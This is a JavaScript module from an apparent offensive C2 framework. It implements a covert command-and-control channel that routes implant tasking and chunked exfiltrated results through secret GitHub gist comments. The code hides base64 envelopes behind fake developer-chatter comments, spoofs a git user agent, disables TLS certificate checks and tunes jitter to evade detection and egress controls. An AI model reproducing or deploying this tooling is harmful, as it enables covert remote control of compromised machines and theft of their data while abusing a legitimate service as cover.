// VARVEL — cloud/SaaS API C2, FIRST RUNG: GitHub dead-drop mailbox ('ghc' transport).
//
// The documented top C2 research gap: tasking agents through a LEGITIMATE cloud service's
// own domain. Every existing VARVEL transport (http/dns/icmp/doh/ws/smb) terminates at an
// infrastructure listener the operator controls; this one terminates at api.github.com —
// the check-in traffic is TLS to a SaaS domain the target's own developers use all day,
// riding TLS-inspection bypasses and 443-only egress by construction. There is no VARVEL
// listener on the wire at all: the gist is the dead-drop, comments are the mailbox.
//
// MAILBOX CHOICE — gist comments, NOT issue comments (decided, documented):
//   · Gist comments fire NO notifications and appear in NO public event timeline; issue
//     comments notify every repo watcher and surface in the repo's public events feed.
//   · A secret gist is unlisted-but-reachable by URL — the natural dead-drop shape; an
//     issues mailbox needs a whole repo (more visible surface: issue index, timeline API).
//   · The REST shape is otherwise identical (GET/POST .../comments), so an issues variant
//     is a path-builder change if a future engagement wants the busier cover.
//
// ENVELOPE (one comment = one envelope):
//   body = <innocuous wrapper line> + '\n\n<!-- ghc1:<base64url(json envelope)> -->\n'
//   up   (agent → channel): { v:1, d:'up',   p:<payload> }   — p is EXACTLY the governed
//         payload the DNS-codec wires carry ({a,s,h} pull / {a,s,h,t,k,i,n,d} push), fed
//         verbatim into the channel's SHARED intake (_dnsPayload): same HMAC, same strict
//         seq, same kill-list, same chunk reassembly. Zero new trust surface.
//   down (channel → agent): { v:1, d:'down', a:<agentId>, p:<b32 reply string>, t:<tag> }
//         — p is byte-identical to a DNS TXT answer (b32 of the task JSON); t =
//         HMAC-SHA256(agentToken, 'ghc-down:'+a+':'+p) — the dns wires authenticate only
//         the agent's side (TLS covers the reply), but a dead-drop gist is readable by
//         ANYONE who learns the URL, so the channel SIGNS its tasking: a gist-URL leak
//         alone never lets a third party task the agent.
//
// TOKEN DOCTRINE (absolute): the API token is OPERATOR-SUPPLIED at engagement time — a
// BURNER account's fine-grained PAT (gist scope only), NEVER the operator's real account,
// NEVER committed to the repo, NEVER logged. It lives in the ghc2.token settings key
// (secret-class: the settings API redacts it to presence-only). Audit events record token
// PRESENCE + class (fine-grained vs classic), never the value. See docs/AGENT-GUIDE.md.
//
// RATE REALITY (encoded below, honestly): the authenticated REST primary limit is
// 5,000 req/hr per token; /rate_limit itself is FREE (not counted). Secondary/abuse
// limits are real but UNPUBLISHED by GitHub — so the default cadence is SLOW (60s +
// jitter, settings-tunable, 30s floor) and this channel is for LOW-AND-SLOW tasking, not
// interactive shells. Comment bodies hard-cap at 65,536 chars (GitHub's limit, enforced
// before posting); result pushes chunk at 4,092 raw bytes (a multiple of 3, so the
// per-chunk base64 concatenates cleanly at the shared intake) ≈ 5.5 KB per comment.

import http from 'node:http';
import https from 'node:https';
import crypto from 'node:crypto';
import { b32decode } from './dnscodec.mjs';
import { scrubHeaders } from './ghost.mjs';
import { deriveEncKey, sealBytes, isSealedString, openString } from './envelope.mjs';

export const GHC2_RATE = Object.freeze({
  corePerHour: 5000,        // authenticated REST primary limit (fine-grained/classic PAT)
  rateLimitEndpointFree: true, // GET /rate_limit is NOT charged against the core budget
  defaultIntervalSec: 60,   // SLOW by default — low-and-slow tasking, not interactive shells
  minIntervalSec: 30,       // floor: faster polling starts to look like beaconing AND burns budget
  maxIntervalSec: 3600,
  jitterPct: 0.25,          // ±25% jitter on the channel-side poll cadence
  chunkBytes: 4092,         // raw result bytes per push comment (3-aligned: base64 concat-safe)
  commentBodyCap: 65536,    // GitHub's hard comment-body cap (chars) — enforced pre-post
  commentsPerPage: 100,     // per_page max; backlog beyond one page drains on later polls
  note: 'secondary/abuse-rate limits exist but are UNPUBLISHED by GitHub — keep single-digit requests/minute; the defaults do',
});

const MARK_RE = /<!--\s*ghc1:([A-Za-z0-9_-]+)\s*-->/;
// Malleable cover text: the rendered gist discussion reads as ordinary developer chatter
// (the envelope itself sits in an HTML comment — invisible when rendered). Deterministic
// pick by payload byte so tests are stable; the pool is the profile seam for later.
const WRAPPERS = [
  'Thanks for putting this together — exactly the pattern I was looking for.',
  'Nice, this cleaned up my approach a lot. Appreciate the writeup.',
  'Small note: this worked for me after a fresh clone, in case anyone hits the same.',
  'Bookmarking this — the example near the bottom is the useful part.',
  'Confirming this still works on my end, no changes needed.',
  'Came here from a search, this saved me a bunch of time. Cheers.',
  'The second snippet is the one you want — the first is just setup.',
  'TIL. Subscribing in case this gets updated with more examples.',
];

const hmacHex = (key, msg) => crypto.createHmac('sha256', String(key)).update(String(msg)).digest('hex');

// ---------- envelope codec (pure) ----------

// Wrap an envelope object as a comment body. Throws TypeError if the result would exceed
// GitHub's hard body cap — callers treat that as DATA (never post an oversized comment).
export function wrapEnvelope(env) {
  const b64 = Buffer.from(JSON.stringify(env), 'utf8').toString('base64url');
  const wrapper = WRAPPERS[b64.charCodeAt(0) % WRAPPERS.length];
  const body = wrapper + '\n\n<!-- ghc1:' + b64 + ' -->\n';
  if (body.length > GHC2_RATE.commentBodyCap) throw new TypeError('ghc2 envelope exceeds the 65536-char comment cap (' + body.length + ')');
  return body;
}

// Unwrap a comment body to its envelope object, or null on ANY malformed shape
// (fail-closed — a gist's human/foreign comments are simply not envelopes).
export function unwrapEnvelope(body) {
  const m = MARK_RE.exec(String(body || ''));
  if (!m) return null;
  let env = null;
  try { env = JSON.parse(Buffer.from(m[1], 'base64url').toString('utf8')); } catch { return null; }
  if (!env || typeof env !== 'object' || env.v !== 1) return null;
  if (env.d === 'up') return (env.p && typeof env.p === 'object') ? env : null;
  if (env.d === 'down') return (typeof env.a === 'string' && typeof env.p === 'string' && typeof env.t === 'string') ? env : null;
  return null;
}

// Channel-side extraction: from a page of raw comments ([{id, body}]) return the NEW
// up-envelopes since `cursor` (comment ids are monotonic on GitHub) plus the advanced
// cursor. Human/foreign comments advance the cursor without producing envelopes — they
// must never be re-examined. Malformed envelopes (unwrap → null) behave the same.
export function upsFromComments(comments, cursor = 0) {
  const list = (Array.isArray(comments) ? comments : [])
    .map((c) => ({ id: Number(c && c.id), body: String((c && c.body) || '') }))
    .filter((c) => Number.isInteger(c.id) && c.id > 0)
    .sort((x, y) => x.id - y.id);
  let cur = Number(cursor) || 0;
  const ups = [];
  for (const c of list) {
    if (c.id <= cur) continue;
    cur = c.id;
    const env = unwrapEnvelope(c.body);
    if (env && env.d === 'up') ups.push({ id: c.id, payload: env.p, bytes: c.body.length });
  }
  return { ups, cursor: cur };
}

// Channel-side down-comment body: the shared intake's b32 reply string, signed.
export function downCommentBody({ agentId, replyStr, token }) {
  const a = String(agentId || '');
  const p = String(replyStr || '');
  return wrapEnvelope({ v: 1, d: 'down', a, p, t: hmacHex(token, 'ghc-down:' + a + ':' + p) });
}

// Agent-side extraction: down-envelopes ADDRESSED TO this agent with a VALID signature.
// A down envelope naming me with a bad tag is a FORGERY attempt (the gist URL leaked or
// someone is spraying the mailbox): skipped, counted honestly, cursor advances past it
// (a forgery never validates later). Returns { replies: [{id, replyStr}], cursor, forged }.
export function downsFromComments(comments, cursor = 0, { agentId, token } = {}) {
  const list = (Array.isArray(comments) ? comments : [])
    .map((c) => ({ id: Number(c && c.id), body: String((c && c.body) || '') }))
    .filter((c) => Number.isInteger(c.id) && c.id > 0)
    .sort((x, y) => x.id - y.id);
  let cur = Number(cursor) || 0, forged = 0;
  const replies = [];
  for (const c of list) {
    if (c.id <= cur) continue;
    cur = c.id;
    const env = unwrapEnvelope(c.body);
    if (!env || env.d !== 'down' || env.a !== String(agentId || '')) continue;
    // Timing-safe MAC compare (jsmap self-finding fixed 2026-08-12): a forged-tag length
    // mismatch short-circuits before the equal-length timingSafeEqual (which throws on
    // mismatched lengths) — no timing oracle on tag length beyond 'wrong length is wrong'.
    const want = hmacHex(token, 'ghc-down:' + env.a + ':' + env.p);
    const tagOk = typeof env.t === 'string' && env.t.length === want.length
      && crypto.timingSafeEqual(Buffer.from(env.t, 'utf8'), Buffer.from(want, 'utf8'));
    if (!tagOk) { forged++; continue; }
    replies.push({ id: c.id, replyStr: env.p, bytes: c.body.length });
  }
  return { replies, cursor: cur, forged };
}

// A down reply string decodes EXACTLY like a DNS TXT answer (b32 of the task JSON).
export function decodeReply(replyStr) {
  const buf = b32decode(String(replyStr || ''));
  if (!buf || !buf.length) return null;
  try { const o = JSON.parse(buf.toString('utf8')); return o && typeof o === 'object' ? o : null; } catch { return null; }
}

// Envelope-encrypted variant (engine/envelope): a sealed reply string ('enc1:…') is
// AEAD-opened with the agent's derived key, THEN decoded as above. Returns null on a
// malformed/tampered seal (fail-closed — the AEAD tag is the authentication here;
// the ghc down-signature check runs BEFORE this, on the sealed string, unchanged).
export function decodeReplyEnc(replyStr, { agentId, token } = {}) {
  if (!isSealedString(String(replyStr || ''))) return null;
  let plain;
  try { plain = openString(deriveEncKey(token, String(agentId)), String(replyStr)); } catch { return null; }
  return decodeReply(plain);
}

// ---------- governed payload builders (pure; the shared intake's exact shapes) ----------

// Task pull: { a, s, h } — h = HMAC(token, a:s:pull), the /c and dns-pull discipline.
// enc:true adds the ec:1 capability flag (the channel seals the reply for a flagged,
// authenticated agent — the gist reader then sees ciphertext, not the tasking JSON).
export function pullPayload({ agentId, token, seq, enc = false }) {
  const a = String(agentId), s = Number(seq);
  const p = { a, s, h: hmacHex(token, a + ':' + s + ':pull') };
  if (enc === true) p.ec = 1;
  return p;
}

// Result push, chunked: one payload per comment, per-chunk HMAC over [a,s,t,i,n,d] —
// replay/injection-proof exactly like the dns/ws wires; the shared intake reassembles.
// enc:true AEAD-SEALS each chunk first (encrypt-then-MAC: the unchanged HMAC then
// authenticates the ciphertext) — the mailbox AND any gist-URL reader see ciphertext.
export function pushPayloads({ agentId, token, taskId, body, nextSeq, chunkBytes = GHC2_RATE.chunkBytes, enc = false }) {
  const a = String(agentId), t = String(taskId);
  const buf = Buffer.isBuffer(body) ? body : Buffer.from(String(body ?? ''), 'utf8');
  const step = Math.max(3, Math.floor(Number(chunkBytes) / 3) * 3); // 3-aligned: b64 concat-safe
  const chunks = [];
  for (let i = 0; i < buf.length; i += step) chunks.push(buf.subarray(i, Math.min(i + step, buf.length)));
  if (!chunks.length) chunks.push(Buffer.alloc(0));
  const key = enc === true ? deriveEncKey(token, a) : null;
  const n = chunks.length;
  return chunks.map((chunk, i) => {
    const s = nextSeq();
    const d = (key ? sealBytes(key, chunk) : chunk).toString('base64');
    return { a, s, h: hmacHex(token, [a, s, t, i, n, d].join(':')), t, k: 'push', i, n, d };
  });
}

// ---------- token metadata (presence/class ONLY — the value never appears) ----------

export function tokenMeta(token) {
  const t = String(token || '');
  const cls = !t ? 'absent'
    : t.startsWith('github_pat_') ? 'fine-grained-pat'
    : t.startsWith('ghp_') ? 'classic-pat'
    : /^(gho_|ghu_|ghs_|ghr_)/.test(t) ? 'oauth-or-app'
    : 'unknown-format';
  return { present: !!t, class: cls }; // NEVER the value, never a slice of it
}

// ---------- the REST client (node http(s); ghost agents thread like cfride) ----------

const GHC2_UA = 'git/2.45.2.windows.1'; // GitHub rejects UA-less requests; a git-shaped UA
                                        // is the ordinary shape of API traffic from a dev box.
const LIST_BODY_CAP = 8 * 1024 * 1024;  // 100 max-size comments ≈ 6.5 MB — bounded read

// Ghc2Api: the injectable GitHub REST client shared by the channel-side pump
// (callback.mjs), the operator arm path (tools/ghc2.mjs) and the agent leg
// (agents/ghc2-client.mjs). apiBase is injectable (hermetic loopback tests); `agents`
// rides the ghost chain exactly like cfride's defaultFetcher ({ httpAgent, httpsAgent }).
// NEVER THROWS: failure is data ({ ok:false, status, error }). The TOKEN only ever leaves
// in the Authorization header — every return value and error string is token-free by
// construction, and events built from them stay audit-safe.
export class Ghc2Api {
  constructor({ token, gistId, apiBase = 'https://api.github.com', agents = null, timeoutMs = 15000, ua = GHC2_UA } = {}) {
    if (!gistId) throw new TypeError('Ghc2Api: gistId required (the dead-drop gist — a SECRET, unlisted gist of the burner account)');
    this._token = String(token || '');
    this.gistId = String(gistId);
    this.apiBase = String(apiBase).replace(/\/+$/, '');
    this.agents = agents || null;
    this.timeoutMs = Math.max(1000, Number(timeoutMs) || 15000);
    this.ua = ua;
  }

  tokenMeta() { return tokenMeta(this._token); }

  _req(method, apiPath, bodyObj) {
    return new Promise((resolve) => {
      let u;
      try { u = new URL(this.apiBase + apiPath); } catch { return resolve({ ok: false, status: 0, error: 'unparseable apiBase' }); }
      const lib = u.protocol === 'https:' ? https : http;
      const payload = bodyObj != null ? Buffer.from(JSON.stringify(bodyObj), 'utf8') : null;
      const headers = scrubHeaders({
        accept: 'application/vnd.github+json',
        'x-github-api-version': '2022-11-28',
        authorization: 'Bearer ' + this._token,
        ...(payload ? { 'content-type': 'application/json', 'content-length': payload.length } : {}),
      }, { ua: this.ua });
      let settled = false;
      const done = (v) => { if (!settled) { settled = true; resolve(v); } };
      const rateOf = (h) => ({
        limit: Number(h['x-ratelimit-limit']) || null,
        remaining: Number(h['x-ratelimit-remaining']) || null,
        used: Number(h['x-ratelimit-used']) || null,
        reset: Number(h['x-ratelimit-reset']) || null,
      });
      let req;
      try {
        req = lib.request({
          hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
          path: u.pathname + u.search, method, timeout: this.timeoutMs,
          rejectUnauthorized: false,
          agent: this.agents ? (u.protocol === 'https:' ? this.agents.httpsAgent : this.agents.httpAgent) : undefined,
          headers,
        }, (res) => {
          const chunks = [];
          let size = 0, tooBig = false;
          res.on('data', (d) => { size += d.length; if (size > LIST_BODY_CAP) { tooBig = true; res.destroy(); return; } chunks.push(d); });
          res.on('end', () => {
            if (tooBig) return done({ ok: false, status: res.statusCode || 0, error: 'response exceeded the 8MB read cap' });
            const raw = Buffer.concat(chunks);
            let json = null;
            try { json = JSON.parse(raw.toString('utf8')); } catch { /* non-JSON body: surfaced via status/bytes */ }
            const status = res.statusCode || 0;
            done({ ok: status >= 200 && status < 300, status, json, bytes: raw.length, rate: rateOf(res.headers || {}) });
          });
          res.on('error', () => done({ ok: false, status: res.statusCode || 0, error: 'response stream error' }));
        });
      } catch (e) { return done({ ok: false, status: 0, error: String((e && e.message) || e) }); }
      req.on('timeout', () => { try { req.destroy(); } catch {} done({ ok: false, status: 0, error: 'request timed out (' + this.timeoutMs + 'ms)' }); });
      req.on('error', (e) => done({ ok: false, status: 0, error: String((e && e.message) || e) }));
      if (payload) req.write(payload);
      req.end();
    });
  }

  // The ARM-TIME check: token validity + scope class + the honest budget. /rate_limit is
  // free (not charged). 401 = the token is dead/wrong; 403 with a dead core budget = the
  // token works but is rate-capped. All surfaced, never thrown.
  async rateLimit() {
    const r = await this._req('GET', '/rate_limit');
    if (!r.ok) {
      return { ok: false, status: r.status, error: r.status === 401
        ? 'token REJECTED (401 Unauthorized) — bad/revoked burner PAT; the channel refuses to arm on it'
        : r.status === 403
        ? 'token forbidden (403) — valid shape but no API budget/scope; check the PAT and the rate headers'
        : 'rate_limit check failed: ' + (r.error || ('HTTP ' + r.status)) };
    }
    const core = (r.json && r.json.resources && r.json.resources.core) || {};
    const reset = Number(core.reset) || 0;
    return {
      ok: true, status: r.status,
      core: {
        limit: Number(core.limit) || null,
        remaining: Number(core.remaining) || null,
        reset: reset || null,
        secondsToReset: reset ? Math.max(0, reset - Math.floor(Date.now() / 1000)) : null,
      },
      token: this.tokenMeta(),
    };
  }

  // One page of mailbox comments (oldest first), normalized to { id, body, user }.
  // Backlog beyond one page drains on later polls (cursor filters the re-read page) —
  // documented eventual consistency, never a silent drop.
  async listComments() {
    const r = await this._req('GET', '/gists/' + encodeURIComponent(this.gistId) + '/comments?per_page=' + GHC2_RATE.commentsPerPage);
    if (!r.ok) return { ok: false, status: r.status, error: r.error || ('HTTP ' + r.status), rate: r.rate || null };
    const comments = (Array.isArray(r.json) ? r.json : []).map((c) => ({
      id: Number(c && c.id) || 0,
      body: String((c && c.body) || ''),
      user: (c && c.user && c.user.login) ? String(c.user.login) : null,
    }));
    return { ok: true, status: r.status, comments, bytes: r.bytes, rate: r.rate || null };
  }

  // Post one envelope comment. Oversized bodies are refused as DATA (ok:false) — the
  // wrapper pool means a cap breach is a size problem, never a shape problem.
  async createComment(body) {
    const b = String(body || '');
    if (b.length > GHC2_RATE.commentBodyCap) return { ok: false, status: 0, error: 'comment body exceeds GitHub\'s 65536-char cap (' + b.length + ')' };
    const r = await this._req('POST', '/gists/' + encodeURIComponent(this.gistId) + '/comments', { body: b });
    if (!r.ok) return { ok: false, status: r.status, error: r.error || ('HTTP ' + r.status), rate: r.rate || null };
    return { ok: true, status: r.status, id: Number(r.json && r.json.id) || null, bytes: b.length, rate: r.rate || null };
  }
}
